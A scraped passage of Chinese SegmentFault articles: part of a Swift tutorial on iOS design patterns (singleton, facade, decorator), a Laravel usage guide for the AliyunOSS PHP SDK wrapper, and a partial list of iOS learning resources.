<li><p>返回计算后的属性值。</p></li>
</ul>
<p>注意：更多的单例模式实例可以看看 <code>Github</code> 上的这个<a rel=""nofollow"" href=""https://github.com/hpique/SwiftSingleton"">示例</a>，列举了单例模式的若干种实现方式。</p>

<p>你现在可以将这个单例作为专辑管理类的入口，接下来我们继续创建一个处理专辑数据持久化的类。</p>

<p>新建 <code>PersistencyManager.swift</code> 并添加如下代码：</p>

<pre><code>private var albums = [Album]()
</code></pre>

<p>在这里我们定义了一个私有属性，用来存储专辑数据。这是一个可变数组，所以你可以很容易的增加或者删除数据。</p>

<p>然后加上一些初始化的数据：</p>

<pre><code>override init() {
  //Dummy list of albums
  let album1 = Album(title: ""Best of Bowie"",
         artist: ""David Bowie"",
         genre: ""Pop"",
         coverUrl: ""http://www.coversproject.com/static/thumbs/album/album_david%20bowie_best%20of%20bowie.png"",
         year: ""1992"")

  let album2 = Album(title: ""It's My Life"",
         artist: ""No Doubt"",
         genre: ""Pop"",
         coverUrl: ""http://www.coversproject.com/static/thumbs/album/album_no%20doubt_its%20my%20life%20%20bathwater.png"",
         year: ""2003"")

  let album3 = Album(title: ""Nothing Like The Sun"",
         artist: ""Sting"",
         genre: ""Pop"",
         coverUrl: ""http://www.coversproject.com/static/thumbs/album/album_sting_nothing%20like%20the%20sun.png"",
         year: ""1999"")

  let album4 = Album(title: ""Staring at the Sun"",
         artist: ""U2"",
         genre: ""Pop"",
         coverUrl: ""http://www.coversproject.com/static/thumbs/album/album_u2_staring%20at%20the%20sun.png"",
         year: ""2000"")

  let album5 = Album(title: ""American Pie"",
         artist: ""Madonna"",
         genre: ""Pop"",
         coverUrl: ""http://www.coversproject.com/static/thumbs/album/album_madonna_american%20pie.png"",
         year: ""2000"")

  albums = [album1, album2, album3, album4, album5]
}
</code></pre>

<p>在这个初始化方法里，我们初始化了五张专辑。如果上面的专辑没有你喜欢的，你可以随意替换成你的菜:]</p>

<p>然后添加如下方法：</p>

<pre><code>func getAlbums() -&gt; [Album] {
  return albums
}

func addAlbum(album: Album, index: Int) {
  if (albums.count &gt;= index) { 
    albums.insert(album, atIndex: index)
  } else {
    albums.append(album)
  }
}

func deleteAlbumAtIndex(index: Int) {
  albums.removeAtIndex(index)
}
</code></pre>

<p>这些方法可以让你自由的访问、添加、删除专辑数据。</p>

<p>这时你可以运行一下你的项目，确保编译通过以便进行下一步操作。</p>

<p>此时你或许会感到好奇： <code>PersistencyManager</code> 好像不是单例啊？是的，它确实不是单例。不过没关系，在接下来的外观模式章节，你会看到 <code>LibraryAPI</code> 和 <code>PersistencyManager</code> 之间的联系。</p>

<h2>外观模式</h2>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850120"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>外观模式在复杂的业务系统上提供了简单的接口。如果直接把业务的所有接口直接暴露给使用者，使用者需要单独面对这一大堆复杂的接口，学习成本很高，而且存在误用的隐患。如果使用外观模式，我们只要暴露必要的 API 就可以了。</p>

<p>下图演示了外观模式的基本概念：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850122"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>API 的使用者完全不知道这内部的业务逻辑有多么复杂。当我们有大量的类并且它们使用起来很复杂而且也很难理解的时候，外观模式是一个十分理想的选择。</p>

<p>外观模式把使用和背后的实现逻辑成功解耦，同时也降低了外部代码对内部工作的依赖程度。如果底层的类发生了改变，外观的接口并不需要做修改。</p>

<p>举个例子，如果有一天你想换掉所有的后台服务，你只需要修改 API 内部的代码，外部调用 API 的代码并不会有改动。</p>

<h3>如何使用外观模式</h3>

<p>现在我们用 <code>PersistencyManager</code> 来管理专辑数据，用 <code>HTTPClient</code> 来处理网络请求，项目中的其他类不应该知道这个逻辑。他们只需要知道 <code>LibraryAPI</code> 这个“外观”就可以了。</p>

<p>为了实现外观模式，应该只让 <code>LibraryAPI</code> 持有 <code>PersistencyManager</code> 和 <code>HTTPClient</code> 的实例，然后 <code>LibraryAPI</code> 暴露一个简单的接口给其他类来访问，这样外部的访问类不需要知道内部的业务具体是怎样的，也不用知道你是通过 <code>PersistencyManager</code> 还是 <code>HTTPClient</code> 获取到数据的。</p>

<p>大致的设计是这样的：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850124"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p><code>LibraryAPI</code> 会暴露给其他代码访问，但是 <code>PersistencyManager</code> 和 <code>HTTPClient</code> 则是不对外开放的。</p>

<p>打开 <code>LibraryAPI.swift</code> 然后添加如下代码：</p>

<pre><code>private let persistencyManager: PersistencyManager
private let httpClient: HTTPClient
private let isOnline: Bool
</code></pre>

<p>除了两个实例变量之外，还有个 <code>Bool</code> 值： <code>isOnline</code> ，这个是用来标识当前是否为联网状态的，如果是联网状态就会去网络获取数据。</p>

<p>我们需要在 <code>init</code> 里面初始化这些变量：</p>

<pre><code>override init() {
  persistencyManager = PersistencyManager()
  httpClient = HTTPClient()
  isOnline = false

  super.init()
}
</code></pre>

<p><code>HTTPClient</code> 并不会直接和真实的服务器交互，只是用来演示外观模式的使用。所以 <code>inOnline</code> 这个值我们一直设置为 <code>false</code>。</p>

<p>接下来在 <code>LibraryAPI.swift</code> 里添加如下代码：</p>

<pre><code>func getAlbums() -&gt; [Album] {
  return persistencyManager.getAlbums()
}

func addAlbum(album: Album, index: Int) {
  persistencyManager.addAlbum(album, index: index)
  if isOnline {
    httpClient.postRequest(""/api/addAlbum"", body: album.description())
  }
}

func deleteAlbum(index: Int) {
  persistencyManager.deleteAlbumAtIndex(index)
  if isOnline {
    httpClient.postRequest(""/api/deleteAlbum"", body: ""\(index)"")
  }
}
</code></pre>

<p>看一下 <code>addAlbum(_:index:)</code> 这个方法，先更新本地缓存，然后如果是联网状态还需要向服务器发送网络请求。这便是外观模式的强大之处：如果外部文件想要添加一个新的专辑，它不会也不用去了解内部的实现逻辑是怎么样的。</p>

<p>注意：当你设计外观的时候，请务必牢记：使用者随时可能直接访问你的隐藏类。永远不要假设使用者会遵循你当初的设计做事。</p>

<p>运行一下你的应用，你可以看到两个空的页面和一个工具栏：最上面的视图用来展示专辑封面，下面的视图展示数据列表。</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850126"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>你需要在屏幕上展示专辑数据，这是就该用下一种设计模式了：装饰者模式。</p>

<h2>装饰者模式</h2>

<p>装饰者模式可以动态的给指定的类添加一些行为和职责，而不用对原代码进行任何修改。当你需要使用子类的时候，不妨考虑一下装饰者模式，可以在原始类上面封装一层。</p>

<p>在 Swift 里，有两种方式实现装饰者模式：扩展 (Extension) 和委托 (Delegation)。</p>

<h3>扩展</h3>

<p>扩展是一种十分强大的机制，可以让你在不用继承的情况下，给已存在的类、结构体或者枚举类添加一些新的功能。最重要的一点是，你可以在你没有访问权限的情况下扩展已有类。这意味着你甚至可以扩展 Cocoa 的类，比如 <code>UIView</code> 或者 <code>UIImage</code> 。</p>

<p>举个例子，在编译时新加的方法可以像扩展类的正常方法一样执行。这和装饰器模式有点不同，因为扩展不会持有扩展类的对象。</p>

<h3>如何使用扩展</h3>

<p>想象一下这个场景，我们需要在下面这个列表里展示数据：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850128"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>专辑标题从哪里来？ <code>Album</code> 本身是个 <code>Model</code> 对象，所以它不应该负责如何展示数据。你需要一些额外的代码添加展示数据的逻辑，但是为了保持 <code>Model</code> 的干净，我们不应该直接修改代码，因为这样不符合单一职责原则。 <code>Model</code> 层最好就是负责纯粹的数据结构，如果有数据的操作可以放到扩展中完成。</p>

<p>接下来我们会创建一个扩展，扩展现有的 <code>Album</code> 类，在扩展里定义了新的方法，返回更适合 <code>UITableView</code> 展示用的数据结构。</p>

<p>数据的结构大概是这样：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004865630"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>新建一个 Swift 文件：<code>AlbumExtensions</code> ，在里面添加如下扩展：</p>

<pre><code>extension Album {
  func ae_tableRepresentation() -&gt; (titles:[String], values:[String]) {
    return ([""Artist"", ""Album"", ""Genre"", ""Year""], [artist, title, genre, year])
  }
}
</code></pre>

<p>在方法的前面有个 <code>ae_</code> 前缀，是 <code>AlbumExtension</code> 的缩写，这样有利于和类的原有方法进行区分，避免使用的时候产生冲突。现在很多还在维护中的第三方库都已经改成了这个风格。</p>

<p>注意：类是可以重写父类方法的，但是在扩展里不可以。扩展里的方法和属性不能和原始类里的方法和属性冲突。</p>

<p>思考一下这个设计模式的强大之处：</p>

<ul>
<li>我们可以直接在扩展里使用 <code>Album</code> 里的属性。</li>
<li>我们给 <code>Album</code> 类添加了内容但是并没有继承它，事实上，使用继承来扩展业务也可以实现一样的功能。</li>
<li>这个简单的扩展让我们可以更好地把 <code>Album</code> 的数据展示在 <code>UITableView</code> 里，而且不用修改源码。</li>
</ul>
<h3>委托</h3>

<p>装饰者模式的另一种实现方案是委托。在这种机制下，一个对象可以和另一个对象相关联。比如你在用 <code>UITableView</code> ，你必须实现 <code>tableView(_:numberOfRowsInSection:)</code> 这个委托方法。</p>

<p>你不应该指望 <code>UITableView</code> 知道你有多少数据，这是个应用层该解决的问题。所以，数据相关的计算应该通过 <code>UITableView</code> 的委托来解决。这样可以让 <code>UITableView</code> 和数据层分别独立。视图层就负责显示数据，你递过来什么我就显示什么。</p>

<p>下面这张图很好的解释了 <code>UITableView</code> 的工作过程：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006776391"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p><code>UITableView</code> 的工作仅仅是展示数据，但是最终它需要知道自己要展示那些数据，这时就可以向它的委托询问。在 objc 的委托模式里，一个类可以通过协议来声明可选或者必须的方法。</p>

<p>看起来似乎继承然后重写必须的方法来的更简单一点。但是考虑一下这个问题：继承的结果必定是一个独立的类，如果你想让某个对象成为多个对象的委托，那么子类这招就行不通了。</p>

<p>注意：委托模式十分重要，苹果在 UIKit 中大量使用了该模式，基本上随处可见。</p>

<h3>如何使用委托模式</h3>

<p>打开 <code>ViewController.swift</code> 文件，添加如下私有变量：</p>

<pre><code>private var allAlbums = [Album]()
private var currentAlbumData : (titles:[String], values:[String])?
private var currentAlbumIndex = 0
</code></pre>

<p>在 <code>viewDidLoad</code> 里面加入如下内容：</p>

<pre><code>override func viewDidLoad() {
    super.viewDidLoad()
    //1
    self.navigationController?.navigationBar.translucent = false
    currentAlbumIndex = 0

    //2
    allAlbums = LibraryAPI.sharedInstance.getAlbums()

    // 3
    // the uitableview that presents the album data
    dataTable.delegate = self
    dataTable.dataSource = self
    dataTable.backgroundView = nil
    view.addSubview(dataTable!)       
}
</code></pre>

<p>对上面三个部分进行拆解：</p>

<ol>
<li><p>关闭导航栏的透明效果</p></li>
<li><p>通过 API 获取所有的专辑数据，记住，我们使用外观模式之后，应该从 <code>LibraryAPI</code> 获取数据，而不是 <code>PersistencyManager</code> 。</p></li>
<li><p>你可以在这里设置你的 <code>UITablweView</code> ，在这里声明了 <code>UITableView</code> 的 <code>delegate</code> 是当前的 <code>ViewController</code> 。事实上你用了 XIB 或者 StoryBoard ，可以直接在可视化的页面里拖拽完成。</p></li>
</ol>
<p>接下来添加一个新的方法用来更方便的获取数据：</p>

<pre><code>func showDataForAlbum(albumIndex: Int) {
    // defensive code: make sure the requested index is lower than the amount of albums
    if (albumIndex &lt; allAlbums.count &amp;&amp; albumIndex &gt; -1) {
        //fetch the album
        let album = allAlbums[albumIndex]
        // save the albums data to present it later in the tableview
        currentAlbumData = album.ae_tableRepresentation()
    } else {
        currentAlbumData = nil
    }
    // we have the data we need, let's refresh our tableview
    dataTable!.reloadData()
} 
</code></pre>

<p><code>showDataForAlbum()</code> 这个方法获取最新的专辑数据，当你想要展示新数据的时候，你需要调用 <code>reloadData()</code> 这个方法，这样 <code>UITableView</code> 就会向委托请求数据，比如有多少个 <code>section</code> 有多少个 <code>row</code> 之类的。</p>

<p>在 <code>viewDidLoad</code> 里面调用上面的方法：</p>

<pre><code>self.showDataForAlbum(currentAlbumIndex)
</code></pre>

<p>这样应用一启动就会去加载当前的专辑数据。因为 <code>currentAlbumIndex</code> 的默认值是 0 ，所以一开始会默认显示第一章专辑的信息。</p>

<p>接下来我们该去完善 <code>DataSource</code> 的协议方法了。你可以直接把委托方法写在类里面，当然如果你想让你的代码看起来更整洁一点，则可以放在扩展里。</p>

<p>在文件底部添加如下方法，注意一定要放在类定义的大括号外面，因为这两个家伙不是类定义的一部分，它们是扩展：</p>

<pre><code>extension ViewController: UITableViewDataSource {
}

extension ViewController: UITableViewDelegate {
}
</code></pre>

<p>上面就是实现委托的方法 - 你可以把协议想象成是与委托之间的约定，只要你实现了约定的方法，就算是实现了委托。在我们的代码中， <code>ViewController</code> 需要遵守 <code>UITableViewDataSource</code> 和 <code>UITableViewDelegate</code> 的协议。这样 <code>UITableView</code> 才能确保必要的委托方法都已经实现了。</p>

<p>在 <code>UITableViewDataSource</code> 对应的那个扩展里加上如下方法：</p>

<pre><code>func tableView(tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int {
  if let albumData = currentAlbumData {
    return albumData.titles.count
  } else {
    return 0
  }
}

func tableView(tableView: UITableView, cellForRowAtIndexPath indexPath: NSIndexPath) -&gt; UITableViewCell {
  var cell:UITableViewCell = tableView.dequeueReusableCellWithIdentifier(""Cell"", forIndexPath: indexPath) as UITableViewCell
  if let albumData = currentAlbumData {
    cell.textLabel?.text = albumData.titles[indexPath.row]
      if let detailTextLabel = cell.detailTextLabel {
        detailTextLabel.text = albumData.values[indexPath.row]
      }
  }
  return cell
}
</code></pre>

<p><code>tableView(_:numberOfRowsInSection:)</code> 返回需要展示的行数，和存储的数据中的 title 的数目相同。</p>

<p><code>tableView(_:cellForRowAtIndexPath:)</code> 创建并且返回了一个单元格，上面有标题和对应的值。</p>

<p>注意：你可以把这些方法直接加在类声明里面，也可以放在扩展里，编译器不会去管数据源到底在哪里，只要能找到对应的方法就可以了。而我们之所以这样做，是为了方便其他人阅读。</p>

<p>此时再构建项目，你可以看到如下内容：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004841444"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>是的，显示成功啦！目前的项目源码在这里：<a rel=""nofollow"" href=""http://cdn5.raywenderlich.com/wp-content/uploads/2014/11/BlueLibrarySwift-Part1.zip"">BlueLibrarySwift-Part1</a>，如果遇到什么问题你可以下载下来对比一下。</p>

<p>下一张我们会继续设计模式的内容，敬请期待！</p>

<hr>
<p>原文链接：</p>

<p>-<a rel=""nofollow"" href=""http://www.raywenderlich.com/86477/introducing-ios-design-patterns-in-swift-part-1"">Introducing iOS Design Patterns in Swift – Part 1/2</a></p>

                ", Swift35/90Days - iOS 中的设计模式 (Swift 版本) 01,1531972154,576,1,440,1,1,https://segmentfault.com/a/1190000002479108
175,1,0,6,"
                    
<pre><code>    ___     __    _                                    ____    _____   _____
   /   |   / /   (_)   __  __  __  __   ____          / __ \  / ___/  / ___/
  / /| |  / /   / /   / / / / / / / /  / __ \        / / / /  \__ \   \__ \
 / ___ | / /   / /   / /_/ / / /_/ /  / / / /       / /_/ /  ___/ /  ___/ /
/_/  |_|/_/   /_/    \__, /  \__,_/  /_/ /_/        \____/  /____/  /____/
                    /____/
</code></pre>

<p>AliyunOSS 是阿里云 OSS 官方 SDK 的 Composer 封装，支持任何 PHP 项目，包括 Laravel、Symfony、TinyLara 等等。Github 地址：<a rel=""nofollow"" href=""https://github.com/johnlui/AliyunOSS"">https://github.com/johnlui/AliyunOSS</a></p>

<h2>更新记录</h2>

<ul>
<li>2015-01-09 <code>Release v1.0</code>
</li>
</ul>
<h2>安装</h2>

<p>将以下内容增加到 composer.json：</p>

<pre><code>json</code><code>require: {
    ""johnlui/aliyun-oss"": ""1.0""
}
</code></pre>

<p>然后运行 <code>composer update</code>。</p>

<h2>使用（以 Laravel 为例）</h2>

<h3>构建 Service 文件</h3>

<p>新建 <code>app/services/OSS.php</code>，内容可参考：<a rel=""nofollow"" href=""https://github.com/johnlui/AliyunOSS/blob/master/OSSExample.php"">OSSExample.php</a>：</p>

<pre><code>php</code><code>&lt;?php

namespace App\Services;

use JohnLui\AliyunOSS\AliyunOSS;

use Config;

class OSS {

  private $ossClient;

  public function __construct()
  {
    $this-&gt;ossClient = AliyunOSS::boot(
      Config::get('app.ossServerInternal'),
      Config::get('app.AccessKeyId'),
      Config::get('app.AccessKeySecret')
    );
  }

  public static function upload($ossKey, $filePath)
  {
    $oss = new OSS();
    $oss-&gt;ossClient-&gt;setBucket('提前设置好的Bucket的名称');
    $oss-&gt;ossClient-&gt;uploadFile($ossKey, $filePath);
  }

  public static function getUrl($ossKey)
  {
    $oss = new OSS();
    $oss-&gt;ossClient-&gt;setBucket('提前设置好的Bucket的名称');
    return $oss-&gt;ossClient-&gt;getUrl($ossKey, new \DateTime(""+1 day""));
  }

  public static function createBucket($bucketName)
  {
    $oss = new OSS();
    return $oss-&gt;ossClient-&gt;createBucket($bucketName);
  }

  public static function getAllObjectKey($bucketName)
  {
    $oss = new OSS();
    return $oss-&gt;ossClient-&gt;getAllObjectKey($bucketName);
  }

}
</code></pre>

<h3>放入自动加载</h3>

<p>在 <code>composer.json</code> 中 <code>autoload -&gt; classmap</code> 处增加配置：</p>

<pre><code>json</code><code>""autoload"": {
    ""classmap"": [
      ""app/services""
    ]
  }
</code></pre>

<p>然后运行 <code>composer dump-autoload</code>。</p>

<h3>增加相关配置</h3>

<p>在 app/config/app.php 中增加三项配置：</p>

<pre><code>php</code><code>'ossServerInternal' =&gt; '服务器内网地址', //青岛为 http://oss-cn-qingdao-internal.aliyuncs.com
'AccessKeyId' =&gt; '阿里云给的AccessKeyId',
'AccessKeySecret' =&gt; '阿里云给的AccessKeySecret',
</code></pre>

<h3>使用</h3>

<pre><code>php</code><code>use App\Services\OSS;

OSS::upload('文件名', '本地路径'); // 上传一个文件

echo OSS::getUrl('某个文件的名称'); // 打印出某个文件的外网链接

OSS::createBucket('一个字符串'); // 新增一个 Bucket。注意，Bucket 名称具有全局唯一性，也就是说跟其他人的 Bucket 名称也不能相同。

OSS::getAllObjectKey('某个 Bucket 名称'); // 获取该 Bucket 中所有文件的文件名，返回 Array。
</code></pre>

<h2>反馈</h2>

<p>有问题请到 <a rel=""nofollow"" href=""http://lvwenhan.com/laravel/425.html"">http://lvwenhan.com/laravel/425.html</a> 下面留言。</p>

                ", JohnLui/AliyunOSS v1.0 发布，附 Laravel 框架详细使用教程及代码,1531972156,459,1,724,1,1,https://segmentfault.com/a/1190000002476574
176,1,0,6,"
                    
<p>这份学习资料是为 iOS 初学者所准备的, 旨在帮助 iOS 初学者们快速找到适合自己的学习资料, 节省他们搜索资料的时间, 使他们更好的规划好自己的 iOS 学习路线, 更快的入门, 更准确的定位的目前所处的位置.</p>

<p>该文档会持续更新, 同时也欢迎更多具有丰富经验的 iOS 开发者将自己的常用的一些工具, 学习资料, 学习心得等分享上来, 我将定期筛选合并, 文档尚有一些不完善之处, 也请不吝指出, 感谢您对 iOS 所做的贡献, 让我们一起把国内的 iOS 做得更好,  谢谢.</p>

<blockquote>
  <p>如果你想帮忙完善这份文档的话, 欢迎上 GitHub 发 PR: <a rel=""nofollow"" href=""https://github.com/Aufree/trip-to-iOS"">https://github.com/Aufree/trip-to-iOS</a></p>
</blockquote>

<blockquote>
  <p>如果您有任何意见或建议也可以通过<a rel=""nofollow"" href=""http://mailto:freedomlijinfa@gmail.com"">邮件</a>或<a rel=""nofollow"" href=""http://weibo.com/jinfali"">微博</a>联系我</p>
</blockquote>

<h2>视频教程(英文)</h2>

<table>
<thead><tr>
<th>视频</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""https://itunes.apple.com/us/course/developing-ios-7-apps-for/id733644550"">Developing iOS 7 Apps for iPhone and iPad</a></td>
  <td>斯坦福开放教程之一, 课程主要讲解了一些 iOS 开发工具和 API 以及 iOS SDK 的使用, 属于 iOS 基础视频</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://itunes.apple.com/itunes-u/ipad-iphone-application-development/id473757255"">iPad and iPhone Application Development</a></td>
  <td>该课程的讲师 Paul Hegarty 是斯坦福大学软件工程学教授, 视频内容讲解得深入, 权威, 深受好评</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://itunes.apple.com/itunes-u/advanced-iphone-development/id407243028"">Advanced iPhone Development - Fall 2010</a></td>
  <td>iOS 开发的进阶课程, 开始涉及到 Core Animation, Core Data, OpenGL 等框架的应用</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/devcenter/ios/index.action"">iOS Dev Center</a></td>
  <td>苹果官方提供的 iOS 学习视频</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.lynda.com/search?q=ios"">Lynda</a></td>
  <td>Lynda 上面 iOS 和 Objective-C 的学习资料比较多, 从初级到高级的都有, 覆盖面比较广, 无论 iOS 走到哪个层次, 都可以在上面挑到适合自己的课程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://www.codeschool.com/paths/ios"">Code School</a></td>
  <td>CodeSchool 上面的 iOS 不多, 不过质量都不错, 一些课程也挺有趣的</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://www.udemy.com/topic/learn-objective-c"">Udemy</a></td>
  <td>Udemy 帮助初学者规划了视频学习路线, 从新手到高级分的比较详细</td>
</tr>
</tbody>
</table>
<h2>视频教程(中文)</h2>

<table>
<thead><tr>
<th>视频</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://v.163.com/special/opencourse/ios7.html"">iOS 7应用开发</a></td>
  <td>斯坦福白胡子老爷爷的系列视频, 所有视频皆完成翻译, 视频较新, 翻译质量也很高</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://v.163.com/special/opencourse/iphonekaifa.html"">iPhone开发教程2010年冬</a></td>
  <td>全部视频翻译完毕, 较为深入的讲解 iPhone 开发, 视频适合给有一定 Objective-C 基础的人观看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.imooc.com/learn/173"">使用Swift开发iOS8 App实战</a></td>
  <td>慕课网的视频, 主要讲 Swift 的一些基本使用, 并在讲解的过程中做了几个小 APP, 最后还讲了 Sketch 制作分享按钮</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.imooc.com/learn/218"">征战Objective-C</a></td>
  <td>视频还未完结, 讲了一些 C 和 Objective-C 的基本语法, 适合零基础的人观看</td>
</tr>
</tbody>
</table>
<h2>书籍</h2>

<table>
<thead><tr>
<th>书籍名称</th>
  <th>推荐理由</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.com/dp/032194206X/ref=cm_sw_r_tw_dp_fWrPub0BGRHJ3"">Objective-C Programming</a></td>
  <td>内容不多, 却都是精华, 有了一点 C 语言基础可以快速阅读此书, 大概一天时间就可以看完, 看完后对 iOS 开发能够有个基本的印象, 该书的<a rel=""nofollow"" href=""http://forums.bignerdranch.com"">官方论坛</a>有各个章节习题的解答.</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://book.douban.com/subject/24538384"">iOS Programming</a></td>
  <td>这本书在 Quora 上被评为 iOS 入门最佳书籍,  具体评价可见豆瓣下方该书籍的评论</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://book.douban.com/subject/3688896"">Cocoa Design Patterns</a></td>
  <td>适合打算深入了解 Cocoa 的人看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://cocoadevcentral.com/d/learn_objectivec"">Learn Objective-C</a></td>
  <td>短小精练, 适合有编程基础的人在半小时内对 Objective-C 有个一定了解</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/Introduction/Introduction.html"">Programming with Objective-C</a></td>
  <td>看完 Learn Obj-C 可以接着看这个官方对 Objective-C 更为深入的介绍</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00COG40Y0/ref=cm_sw_r_qz_2_dp_l2OPub0N45R0Q"">Objective-C 基础教程</a></td>
  <td>该书作者 Scott Knaster 是 Mac 开发界的传奇人物, 目前在 Google 出过多数书籍都广受许多程序员好评, 此书适合从初级跳到中级的 iOS 开发者阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00R43XG9S/ref=cm_sw_r_qz_pi_T2A_jdp_fCPPub0VBF67T"">iOS 开发进阶</a></td>
  <td>该书作者唐巧是国内 iOS 开发界的名人, 曾参与多个知名软件的开发, 目前该书尚在预售中, 书本内容由浅入深, 将读者一步一步引入到 iOS 中去, 同样适合初级跳到中级的 iOS 开发者阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.com/Programming-Objective-C-Edition-Developers-Library/dp/0321967607"">Programming in Objective-C</a></td>
  <td>这本书在亚马逊上面深受欢迎, 有关 Objective-C 的东西讲得非常详细</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00JPVNFKM/ref=cm_sw_r_qz_4_dp_tdPPub14X59PV"">iOS 测试指南</a></td>
  <td>该书作者是豆瓣的员工, 书中写的多数内容都是作者在平时的工作实践当中提炼出来的测试经验, 重点讲述了各个测试阶段的具体实践方法, 并且通过持续集成串联了各个测试阶段的活动。</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://book.douban.com/subject/6920082"">Objective-C编程之道</a></td>
  <td>解析 iOS 的开山之作, 详细介绍了 MVC 在 Cocoa Touch 上的运作过程, 该书适用于 iOS 中级开发者阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00DE60G3S/ref=cm_sw_r_qz_2_dp_hdPPub11MFE6G"">Objective-C高级编程</a></td>
  <td>本书主要介绍 iOS 与 OS X 多线程和内存管理, 深入破析了苹果官方公布的源代码,  告诉你一些苹果公司官方文档中不会出现的知识, 适合中级以上 iOS 开发人员阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00IDSGY06/ref=cm_sw_r_qz_2_dp_A2OPub0CH96YH"">Effective Objective C 2.0</a></td>
  <td>书里写了编写高质量iOS与OS X代码的52个有效方法, 适合 iOS 开发的进阶使用</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.com/dp/0990402053/ref=cm_sw_r_tw_dp_louPub127Q1YP"">Swift Fundamentals</a></td>
  <td>估计将来这本书会成为 Swift 的经典入门书籍, 它的 Stars 数说明了一切</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://numbbbbb.gitbooks.io/-the-swift-programming-language-/content"">The Swift Programming Language 中文版</a></td>
  <td>90 后开发者梁杰组织翻译的 Swift 编程语言中文版</td>
</tr>
</tbody>
</table>
<h2>博客</h2>

<table>
<thead><tr>
<th>博客地址</th>
  <th>博主信息</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://onevcat.com/#blog"">OneV's Den</a></td>
  <td>王巍(喵神), 现居日本, 就职于 LINE, 知名 iOS 开发者, 写的文章大多深入浅出, 内容广泛, 目前在维护的 <a rel=""nofollow"" href=""http://swifter.tips"">Swifter</a> 也值得收藏</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.devtang.com"">唐巧的技术博客</a></td>
  <td>唐巧, 国内知名 iOS 开发者, 现就职于猿题库, 博客推出的 iOS 移动开发周报很受欢迎, 更新频繁</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.txx.im"">txx's blog</a></td>
  <td>90 后 iOS 开发者, 人称虾神, 文章内容讲解大多浅白易懂, 很值得看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://beyondvincent.com"">破船之家</a></td>
  <td>博主也是 iOS 大神一个, 经常更新一些 iOS 教程, 文章的质量都很高, 非常值得看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://nshipster.cn"">NSHipster</a></td>
  <td>NSHipster 的中文网站, 主要对 NSHipster 的英文网站进行翻译, 博文出自 Mattt 大神之手, 文章大都写得很深入, 详细, 每周一更</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.leezhong.com"">Limboy 无网不剩</a></td>
  <td>李忠, 知乎前员工, 目前在负责花瓣 iOS 开发, 不少文章里面有介绍博主个人的学习方法, 让读者在学到技术的同时也掌握学习的技巧</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://nianxi.net"">念茜的博客</a></td>
  <td>iOS 圈的女神人物, 写的关于安全问题的文章都值得一看, 由于新博客刚开通不久, 目前文章较少, 可以去看下她以前的<a rel=""nofollow"" href=""http://blog.csdn.net/yiyaaixuexi"">博客</a>
</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://weekly.ios-wiki.com/history"">iOS技术周报</a></td>
  <td>吴发伟, 天猫资深软件开发工程师, iOS 技术周报每周一更, 推送一些 iOS 技巧, 代码库, 设计等资讯.</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.iwangke.me"">iWangKe.me</a></td>
